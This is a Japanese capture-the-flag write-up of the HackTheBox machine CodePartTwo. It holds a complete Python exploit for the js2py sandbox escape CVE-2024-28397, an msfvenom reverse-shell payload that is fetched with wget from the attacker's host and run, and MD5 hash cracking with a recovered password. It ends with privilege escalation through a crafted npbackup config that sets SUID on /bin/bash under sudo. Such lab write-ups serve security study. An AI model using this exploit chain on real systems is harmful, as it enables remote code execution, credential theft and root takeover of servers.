---
title: "[Easy] CodePartTwo HackTheBox"
emoji: "👨‍💻"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["hackthebox", "pentest", "linux", "cve"]
published: false
---

# TL;DR

- js2py v0.74の既知の脆弱性(CVE-2024-28397)を利用してRCEを実行します
- SQLiteデータベースから取得したハッシュをクラックしてSSHアクセスを取得します
- sudoで実行可能なnpbackup-cliの設定ファイルにpre_exec_commandsを仕込んで権限昇格を実現します

# 🔎 Enumeration

## port scan

nmapでポートスキャンを実行します。

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: gunicorn/20.0.4
```

22番ポートでSSH、8000番ポートでGunicorn 20.0.4が動作しています。

## web walk 80/tcp

ウェブGUIが表示されます。

![](/images/codeparttwo_easy/screenshot_01.png)

## directory fuzzing

gobusterを使ってディレクトリの探索を行います。

```
$ gobuster dir -u http://10.129.232.59:8000/ -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x py,php,txt,bak,sh -o gobuster_dir.txt  --rua
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.232.59:8000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.702.0 Chrome/12.0.702.0 Safari/534.24
[+] Extensions:              py,php,txt,bak,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
download             (Status: 200) [Size: 10708]
login                (Status: 200) [Size: 667]
register             (Status: 200) [Size: 651]
```

downloadというエンドポイントが見つかります。アクセスするとapp.zipが落ちてきます。展開して中を確認すると、ウェブアプリケーションのソースコードが入っています。gunicornはPython製のWSGI（Web Server Gateway Interface）サーバーなので、Python製のアプリケーションだと推測できます。

```
$ tree
.
├── app.py
├── instance
│   └── users.db
├── requirements.txt
├── static
│   ├── css
│   │   └── styles.css
│   └── js
│       └── script.js
└── templates
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html

6 directories, 11 files
```

app.pyの中を見ていくと、/run_codeのエンドポイントでjs2pyのモジュールを使ってcodeを実行しています。

```python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

js2pyのバージョンは0.74であることがわかります。

```
$ cat requirements.txt

flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

[CVE-2024-28397](https://nvd.nist.gov/vuln/detail/CVE-2024-28397)の脆弱性が存在します。js2py v0.74までのjs2py.disable_pyimport()に欠陥があり、細工したAPI呼び出しで任意コード実行が可能です。

コードを見ると、js2py.disable_pyimport()は実装されています。

```python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
```

# ⚒️ Exploit -user flag-

## run PoC

[GitHub上のPoC](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)を参考にエクスプロイトスクリプトを作成します。

```python
#!/usr/bin/env python3
import requests
import json
import argparse

# CVE-2024-28397 - js2py Sandbox Escape Payload
def get_payload(cmd):
    """Generate CVE-2024-28397 exploit payload"""
    payload = f"""
let cmd = "{cmd}"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({{}})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {{
    let result;
    for(let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            return item
        }}
        if(item.__name__ != "type" && (result = findpopen(item))) {{
            return result
        }}
    }}
}}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
n11[0].decode()
"""
    return payload

def run_command(target, proxy, cmd):
    """Execute command on target via RCE"""
    payload = get_payload(cmd)
    data = {"code": payload}

    proxies = None
    if proxy:
        proxies = {"http": proxy, "https": proxy}

    try:
        response = requests.post(
            f"{target}/run_code",
            json=data,
            proxies=proxies,
            timeout=10
        )
        result = response.json()

        if "result" in result:
            return result["result"]
        elif "error" in result:
            return f"Error: {result['error']}"
        else:
            return str(result)
    except Exception as e:
        return f"Exception: {str(e)}"

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2024-28397 js2py RCE Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s -t http://10.129.232.59:8000 -c "id"
  %(prog)s -t http://10.129.232.59:8000 -p http://127.0.0.1:8080 -c "whoami"
        '''
    )
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., http://10.129.232.59:8000)')
    parser.add_argument('-p', '--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-c', '--command', required=True, help='Command to execute on target')

    args = parser.parse_args()

    print(f"[+] Target: {args.target}")
    if args.proxy:
        print(f"[+] Proxy: {args.proxy}")
    print(f"[+] Command: {args.command}")
    print(f"[+] Executing CVE-2024-28397 exploit...")
    print()

    result = run_command(args.target, args.proxy, args.command)
    print("[+] Result:")
    print(result)

if __name__ == "__main__":
    main()
```

実行します。

```
$ python3 exploit.py -t http://10.129.232.59:8000 -p http://127.0.0.1:8080 -c "id"
[+] Target: http://10.129.232.59:8000
[+] Proxy: http://127.0.0.1:8080
[+] Command: id
[+] Executing CVE-2024-28397 exploit...

[+] Result:
uid=1001(app) gid=1001(app) groups=1001(app)
```

idコマンドが実行され、RCEに成功しました。

## get reverse shell

ペイロードを作成して、Webサーバーを立ち上げます。

```
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.64 LPORT=7777 -f elf -o rev.elf

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

ペイロードをターゲットマシンで取得し、実行します。

```
$ python3 exploit.py -t http://10.129.232.59:8000  -c "wget -O /tmp/rev.elf http://10.10.14.64:8000/rev.elf"

$ python3 exploit.py -t http://10.129.232.59:8000  -c "/tmp/rev.elf"
[+] Target: http://10.129.232.59:8000
[+] Command: /tmp/rev.elf
[+] Executing CVE-2024-28397 exploit...

[+] Result:
Exception: HTTPConnectionPool(host='10.129.232.59', port=8000): Read timed out. (read timeout=10)
```

meterpreterシェルを取得しました。

```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.64:7777
[*] Sending stage (3090404 bytes) to 10.129.232.59
[*] Meterpreter session 2 opened (10.10.14.64:7777 -> 10.129.232.59:58828) at 2026-01-01 21:11:29 -0100

meterpreter > getuid
Server username: app
```

# 🔎 Enumeration

## Internal Enumeration

users.dbがあるので取得します。

```
meterpreter > ls
Listing: /home/app/app/instance
===============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  16384  fil   2025-06-18 07:36:01 -0100  users.db

meterpreter > download users.db
[*] Downloading: users.db -> /home/dash/htb/CodePartTwo/users.db
[*] Downloaded 16.00 KiB of 16.00 KiB (100.0%): users.db -> /home/dash/htb/CodePartTwo/users.db
[*] Completed  : users.db -> /home/dash/htb/CodePartTwo/users.db
```

SQLiteのファイルを開くと、ユーザーのハッシュ値が手に入ります。

![](/images/codeparttwo_easy/screenshot_02.png)

hashcatに食わせると、クラックできました。

```
$ cat hash.txt
649c9d65a206a75f5abe509fe128bce5
a97588c0e2fa3a024876339e27aeb42e
$ hashcat -m 0 -d 1 hash.txt /opt/SecLists/rockyou.txt

649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
```

## SSH Login

SSHでログインします。

```
$ ssh marco@10.129.232.59

$ marco@codeparttwo:~$ cat user.txt
2d3ae****************b7d5c0
```

ユーザーフラグを取得できました。

# 👻 Exploit -root flag-

## Internal Enumeration

npbackupの設定ファイルとbackupsのディレクトリがあります。どちらも所有者がrootになっています。

```
$ ls -lh
total 12K
drwx------ 7 root root  4.0K Apr  6  2025 backups
-rw-rw-r-- 1 root root  2.9K Jun 18  2025 npbackup.conf
-rw-r----- 1 root marco   33 Jan  1 21:38 user.txt
```

npbackupの設定ファイルを確認します。

```
$ cat npbackup.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

権限を確認すると、npbackup-cliにNOPASSWDの設定があります。

```
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

設定ファイルにpre_exec_commandsの欄があり、コマンドが実行できそうです。

## Privilege Escalation

悪意あるコマンドを入れた設定ファイルを作成します。

```yaml
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: /tmp/fake_backup
    repo_group: default_group
    backup_opts:
      paths:
      - /tmp
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: fakepassword
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: false
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files: []
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 0 MiB
      pre_exec_commands:
      - "chmod +s /bin/bash"
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 0
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__exploit
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

設定ファイルをコマンドライン引数で渡してコマンドを実行します。すると挿入した悪意あるコマンドが実行され、管理者権限を取得することができました。

```
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c /tmp/evil.conf --backup

marco@codeparttwo:~$ ls -alh /bin/bash
-rwsr-sr-x 1 root root 1.2M Apr 18  2022 /bin/bash

marco@codeparttwo:~$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
root.txt  scripts
bash-5.0# cat root.txt
a852e3******************66fbda
```

rootフラグを取得できました。
